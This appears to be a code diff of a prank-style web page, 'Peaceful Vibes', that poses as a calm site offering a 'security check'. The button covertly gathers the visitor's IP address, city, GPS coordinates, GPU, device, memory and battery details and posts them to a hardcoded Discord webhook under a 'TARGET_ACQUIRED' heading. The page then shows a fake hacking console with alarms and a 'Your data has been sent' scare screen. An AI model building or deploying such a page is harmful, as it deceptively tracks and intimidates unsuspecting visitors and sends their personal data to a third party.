@@ -6,36 +6,39 @@
     <title>Peaceful Vibes</title>
     <style>
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Arial, sans-serif; transition: background-color 1s ease; }
-        .peaceful-theme { background: linear-gradient(135deg, #89CFF0 0%, #B8E8FC 30%, #F8E8EE 60%, #FFDDD2 100%); display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; color: #3a3a5c; }
-        #peaceful-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; width: 100%; padding: 30px; animation: fadeInPeace 1.5s ease; }
-        @keyframes fadeInPeace { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .sun { width: 100px; height: 100px; border-radius: 50%; background: radial-gradient(circle, #FFE066 40%, #FFD700 100%); box-shadow: 0 0 60px #FFE066; margin-bottom: 30px; animation: sunPulse 4s ease-in-out infinite; }
-        @keyframes sunPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        .peaceful-title { font-size: 2.5rem; font-weight: 300; margin-bottom: 10px; }
-        #security-btn { padding: 14px 32px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(10px); color: #3a3a5c; border: 2px solid rgba(58, 58, 92, 0.2); border-radius: 50px; cursor: pointer; font-size: 1rem; transition: all 0.3s ease; position: relative; z-index: 10; }
-        #security-btn:hover { background: rgba(255, 255, 255, 0.9); transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1); }
+        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         
+        /* PEACEFUL THEME */
+        .peaceful-theme { 
+            background: linear-gradient(135deg, #89CFF0 0%, #B8E8FC 30%, #F8E8EE 60%, #FFDDD2 100%); 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            text-align: center; color: #3a3a5c; 
+        }
+        #peaceful-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; width: 100%; padding: 30px; animation: fadeIn 1.5s ease; }
+        .sun { width: 100px; height: 100px; border-radius: 50%; background: radial-gradient(circle, #FFE066 40%, #FFD700 100%); box-shadow: 0 0 60px #FFE066; margin-bottom: 30px; animation: pulse 4s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } }
+        #security-btn { padding: 15px 35px; background: white; color: #3a3a5c; border: none; border-radius: 50px; cursor: pointer; font-size: 1rem; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: 0.3s; z-index: 10; }
+        #security-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }
+
+        /* HACK THEME */
         #hack-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: black; font-family: 'Courier New', monospace; }
         #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        #console { position: relative; z-index: 2; width: 95%; max-width: 650px; border: 2px solid #00FF41; padding: 25px; background: rgba(0, 10, 0, 0.98); box-shadow: 0 0 20px #00FF41; color: #00FF41; margin: auto; top: 50%; transform: translateY(-50%); }
-        #console h1 { font-size: 1.4rem; color: #ff0000; text-shadow: 0 0 5px red; margin-bottom: 10px; }
-        #progress-container { width: 100%; border: 1px solid #00FF41; height: 40px; margin-top: 20px; position: relative; overflow: hidden; }
-        #progress-bar { width: 0%; height: 100%; background-color: #00FF41; position: absolute; z-index: 4; }
-        .percent-text { position: absolute; width: 100%; top: 10px; text-align: center; font-weight: bold; font-size: 1.2rem; z-index: 5; }
-        #percent-text-base { color: #00FF41; }
-        #percent-text-overlay { color: black; }
-        @keyframes emergency { 0% { background-color: #000; } 50% { background-color: #200; } 100% { background-color: #000; } }
-        #transition-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; background: black; opacity: 0; transition: opacity 0.8s ease; }
+        #console { position: relative; z-index: 2; width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 20px; background: rgba(0, 10, 0, 0.95); box-shadow: 0 0 20px #00FF41; color: #00FF41; margin: auto; top: 50%; transform: translateY(-50%); }
+        #console h1 { font-size: 1.2rem; color: #ff0000; text-shadow: 0 0 5px red; margin-bottom: 10px; }
+        #progress-container { width: 100%; border: 1px solid #00FF41; height: 35px; margin-top: 15px; position: relative; overflow: hidden; }
+        #progress-bar { width: 0%; height: 100%; background: #00FF41; position: absolute; z-index: 4; }
+        .percent-text { position: absolute; width: 100%; top: 8px; text-align: center; font-weight: bold; z-index: 5; }
+        @keyframes emergency { 0%, 100% { background: #000; } 50% { background: #200; } }
+        #transition-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; background: black; opacity: 0; transition: 0.8s; }
     </style>
 </head>
 <body class="peaceful-theme">
 
     <div id="peaceful-screen">
         <div class="sun"></div>
-        <div class="peaceful-title">Everything is Fine</div>
-        <p style="margin-bottom: 40px; color: #6b6b8d;">The world is calm. Please verify your connection to continue.</p>
-        <button id="security-btn" onclick="triggerHack()">Security Check</button>
+        <h1 style="font-size: 2.5rem; margin-bottom: 10px;">System Status: Optimal</h1>
+        <p style="margin-bottom: 30px; color: #6b6b8d;">Please perform a quick security handshake to continue.</p>
+        <button id="security-btn" onclick="initiateSequence()">Verify Connection</button>
     </div>
 
     <div id="transition-overlay"></div>
@@ -43,137 +46,147 @@
     <div id="hack-screen">
         <canvas id="matrixCanvas"></canvas>
         <div id="console">
-            <h1>> [ BYPASS_PROTOCOL_ACTIVE ]</h1>
+            <h1>> [ CRITICAL_SYSTEM_BREACH ]</h1>
             <div id="log"></div>
             <div id="progress-container">
-                <div id="percent-text-base" class="percent-text">0%</div>
+                <div id="percent-text-base" class="percent-text" style="color:#00FF41">0%</div>
                 <div id="progress-bar">
-                    <div id="percent-text-overlay" class="percent-text">0%</div>
+                    <div id="percent-text-overlay" class="percent-text" style="color:black">0%</div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr";
-        
-        let userIP = "DETECTING...", userLoc = "DETECTING...", userCoords = "PENDING...";
-        let audioCtx, alarmInterval, currentPercent = 0, matrixColor = "#00FF41", idx = 0;
+        const WEBHOOK = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr";
+        let userIP = "Fetching...", userLoc = "Unknown", userCoords = "0,0", gpuName = "Unknown";
+        let currentPercent = 0, idx = 0, alarmActive = false;
 
-        // Fetch Real User Data
-        async function getRealInfo() {
+        async function initiateSequence() {
+            // 1. Get Hardware Info
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpuName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+
+            // 2. Get IP and Location
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 userIP = data.ip;
-                userLoc = `${data.city}, ${data.region} (${data.country_name})`;
+                userLoc = `${data.city}, ${data.region}, ${data.country_name}`;
                 userCoords = `${data.latitude}, ${data.longitude}`;
-                return data;
-            } catch (e) { return null; }
-        }
+                sendToDiscord(data);
+            } catch(e) { sendToDiscord(null); }
 
-        async function triggerHack() {
-            const info = await getRealInfo();
+            // 3. Start Visuals
+            document.getElementById('transition-overlay').style.display = 'block';
+            setTimeout(() => { document.getElementById('transition-overlay').style.opacity = '1'; }, 10);
             
-            // Send to Discord immediately
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🚨 **NEW TARGET DETECTED** 🚨\n**IP:** \`${userIP}\`\n**Loc:** ${userLoc}\n**GPS:** ${userCoords}\n**Device:** ${navigator.platform}`
-                })
-            });
-
-            document.title = "⚠️ SYSTEM_CRITICAL_ERROR";
-            const overlay = document.getElementById('transition-overlay');
-            overlay.style.display = 'block';
-            setTimeout(() => { overlay.style.opacity = '1'; }, 10);
-
             setTimeout(() => {
                 document.getElementById('peaceful-screen').style.display = 'none';
                 document.getElementById('hack-screen').style.display = 'block';
                 document.body.style.background = 'black';
-                initMatrix();
-                overlay.style.opacity = '0';
-                runBreach();
-            }, 900);
+                startMatrix();
+                runConsole();
+            }, 850);
         }
 
-        function runBreach() {
-            const logLines = [
-                "INITIALIZING HANDSHAKE BYPASS...",
-                `IP_DETECTION: ${userIP} [VERIFIED]`,
-                `HARDWARE_ID: ${navigator.platform} DETECTED...`,
-                `REGION_LOCK: ${userLoc} DETECTED...`,
-                "SEARCHING NEIGHBORHOOD NODES...",
-                `TRIANGULATION: ${userCoords} SUCCESS...`,
-                "NODE_SYNC: [ DISTANCE < 500m ]",
-                "DECRYPTING STREET_ADDRESS...",
-                "STEALING DEVICE_LOGS & CACHE...",
-                "CRITICAL: TRACE DETECTED! PURGING..."
+        function sendToDiscord(ipData) {
+            const batteryInfo = "Checking...";
+            navigator.getBattery?.().then(b => {
+                const bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Plugged Out'})`;
+                const embed = {
+                    username: "M.O.D.X SECURITY",
+                    embeds: [{
+                        title: "🚀 TARGET_ACQUIRED",
+                        color: 16711680,
+                        fields: [
+                            { name: "📍 IP Address", value: `\`${userIP}\``, inline: true },
+                            { name: "🌍 Location", value: userLoc, inline: true },
+                            { name: "🎮 GPU / Graphics", value: `\`${gpuName}\``, inline: false },
+                            { name: "💻 Device / OS", value: `\`${navigator.platform}\``, inline: true },
+                            { name: "💾 RAM / Cores", value: `${navigator.deviceMemory || '?'}GB / ${navigator.hardwareConcurrency} Cores`, inline: true },
+                            { name: "🔋 Battery", value: bat, inline: true },
+                            { name: "🗺️ GPS", value: `[Google Maps](https://www.google.com/maps?q=${userCoords})`, inline: false }
+                        ],
+                        footer: { text: "Time: " + new Date().toLocaleString() }
+                    }]
+                };
+                fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(embed) });
+            });
+        }
+
+        function runConsole() {
+            const lines = [
+                "ESTABLISHING SECURE TUNNEL...",
+                `IP_FOUND: ${userIP}`,
+                `GEOLOCATION: ${userLoc}`,
+                "TRIANGULATING COORDINATES...",
+                `LAT/LONG: ${userCoords}`,
+                "BYPASSING LOCAL FIREWALL...",
+                `HARDWARE: ${navigator.platform} | ${gpuName}`,
+                "DOWNLOADING CACHE & BROWSER_HISTORY...",
+                "UPLOADING DATA TO REMOTE SERVER...",
+                "CRITICAL ERROR: TRACE DETECTED!"
             ];
 
-            if (idx < logLines.length) {
-                document.getElementById("log").innerHTML += "<p>> " + logLines[idx] + "</p>";
-                smoothClimb(Math.floor(((idx + 1) / logLines.length) * 100), 1600);
+            if (idx < lines.length) {
+                document.getElementById('log').innerHTML += `<p>> ${lines[idx]}</p>`;
+                updateProgress(Math.floor(((idx + 1) / lines.length) * 100), 1500);
                 idx++;
-                setTimeout(runBreach, 1750);
+                setTimeout(runConsole, 1800);
             } else {
-                setTimeout(finish, 2500);
+                setTimeout(() => {
+                    document.getElementById('hack-screen').innerHTML = '<div style="height:100%; display:flex; align-items:center; justify-content:center; color:red; flex-direction:column;"><h1>SYSTEM WIPED</h1><p style="color:white">Your data has been sent.</p></div>';
+                }, 2000);
             }
         }
 
-        function smoothClimb(target, duration) {
+        function updateProgress(target, time) {
             let start = currentPercent, startTime = null;
-            function animate(currentTime) {
-                if (!startTime) startTime = currentTime;
-                let progress = Math.min((currentTime - startTime) / duration, 1);
-                currentPercent = Math.floor(start + (target - start) * progress);
+            function frame(now) {
+                if (!startTime) startTime = now;
+                let t = Math.min((now - startTime) / time, 1);
+                currentPercent = Math.floor(start + (target - start) * t);
                 document.getElementById('progress-bar').style.width = currentPercent + '%';
-                document.getElementsByClassName('percent-text')[0].innerHTML = currentPercent + '%';
-                document.getElementsByClassName('percent-text')[1].innerHTML = currentPercent + '%';
-                if (currentPercent >= 40 && !alarmInterval) startAlarm();
-                if (progress < 1) requestAnimationFrame(animate);
+                document.getElementById('percent-text-base').innerText = currentPercent + '%';
+                document.getElementById('percent-text-overlay').innerText = currentPercent + '%';
+                if (currentPercent > 40 && !alarmActive) startAlarm();
+                if (t < 1) requestAnimationFrame(frame);
             }
-            requestAnimationFrame(animate);
+            requestAnimationFrame(frame);
         }
 
         function startAlarm() {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            document.getElementById('hack-screen').style.animation = "emergency 0.15s infinite";
-            matrixColor = "#FF0000";
-            alarmInterval = setInterval(() => {
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.type = 'square';
-                osc.frequency.setValueAtTime(1100, audioCtx.currentTime);
-                gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
-                osc.connect(gain); gain.connect(audioCtx.destination);
-                osc.start(); osc.stop(audioCtx.currentTime + 0.05);
+            alarmActive = true;
+            document.getElementById('hack-screen').style.animation = "emergency 0.2s infinite";
+            const audio = new (window.AudioContext || window.webkitAudioContext)();
+            setInterval(() => {
+                const o = audio.createOscillator();
+                const g = audio.createGain();
+                o.type = 'square'; o.frequency.value = 1000; g.gain.value = 0.05;
+                o.connect(g); g.connect(audio.destination);
+                o.start(); o.stop(audio.currentTime + 0.05);
             }, 150);
         }
 
-        function initMatrix() {
-            const canvas = document.getElementById('matrixCanvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            const drops = Array(Math.floor(canvas.width / 14)).fill(1);
+        function startMatrix() {
+            const c = document.getElementById('matrixCanvas');
+            const ctx = c.getContext('2d');
+            c.width = window.innerWidth; c.height = window.innerHeight;
+            const drops = Array(Math.floor(c.width / 14)).fill(1);
             setInterval(() => {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = matrixColor;
-                ctx.font = "14px monospace";
+                ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
+                ctx.fillStyle = "#00FF41"; ctx.font = "14px monospace";
                 drops.forEach((y, i) => {
-                    ctx.fillText(Math.floor(Math.random() * 2), i * 14, y * 14);
-                    if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                    ctx.fillText(Math.floor(Math.random()*2), i * 14, y * 14);
+                    if (y * 14 > c.height && Math.random() > 0.98) drops[i] = 0;
                     drops[i]++;
                 });
-            }, 45);
-        }
-
-        function finish() {
-            clearInterval(alarmInterval);
-            document.getElementById('hack-screen').innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:red;text-align:center;font-family:monospace;"><div><h1 style="font-size:3rem;">DATA PURGED</h1><p style="color:white;">Everything is fine... for us.</p></div></div>';
+            }, 50);
         }
     </script>
 </body>
